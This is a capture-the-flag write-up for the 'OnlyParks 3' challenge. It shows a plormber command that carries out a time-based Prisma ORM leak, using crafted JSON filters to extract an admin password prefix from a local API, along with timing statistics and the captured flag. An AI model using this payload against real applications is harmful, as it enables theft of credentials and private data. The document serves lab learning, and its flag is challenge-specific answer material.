# OnlyParks 3 📖🎡🎢

## Write-up

In this challenge, since we do not have access to the output, we have to use a time-based attack. It is a bit harder to use with an ORM, but it is still possible using big queries and statistical analysis. The tool [`plormber`](https://github.com/elttam/plormber) can do it for us.

Here's the command line: 
```bash
plormber prisma-contains \
  --verbose-stats \
  --dumped-prefix flag- \
  --base-query-json '{"where":{PAYLOAD}}' \
  --leak-query-json '{"clowns":{"some":{"clown":{"isAdmin":true,"password":{"startsWith":"{ORM_LEAK}"}}}}}' \
  --contains-payload-json '{"body":{"contains":"{RANDOM_STRING}"}}' \
  http://127.0.0.1:5002/api/article
```

Output example with the flag.
```
stats analysis comparing flag-08826f5b2a0fb34674c7a808757173e to (G$BF]/6I>x(M'rP!cZzbgD6/R=MVhrytI;[
                                          mean    median       std  size
test_dump_val
(G$BF]/6I>x(M'rP!cZzbgD6/R=MVhrytI;[  0.108509  0.107304  0.021999     3
flag-08826f5b2a0fb34674c7a808757173e  0.285277  0.306284  0.042978     3
p_value for flag-08826f5b2a0fb34674c7a808757173e: 0.004043008900464535

100%|█████████████████████████████████████████████████████████████████████████████████████████████████████| 1/1 [00:00<00:00,  3.31it/s]
stats analysis comparing flag-08826f5b2a0fb34674c7a808757173e5 to 6I72;ZV:#UT}76Q:F7Z#Z~_t-egZR@<4KmBG?
                                           mean    median       std  size
test_dump_val
6I72;ZV:#UT}76Q:F7Z#Z~_t-egZR@<4KmBG?  0.135106  0.122002  0.025362     3
flag-08826f5b2a0fb34674c7a808757173e5  0.270954  0.267134  0.010239     3
p_value for flag-08826f5b2a0fb34674c7a808757173e5: 0.0026670034792631164

Path check detected no errors! Continuing exploitation.
```

## Flag

`flag-08826f5b2a0fb34674c7a808757173e5`
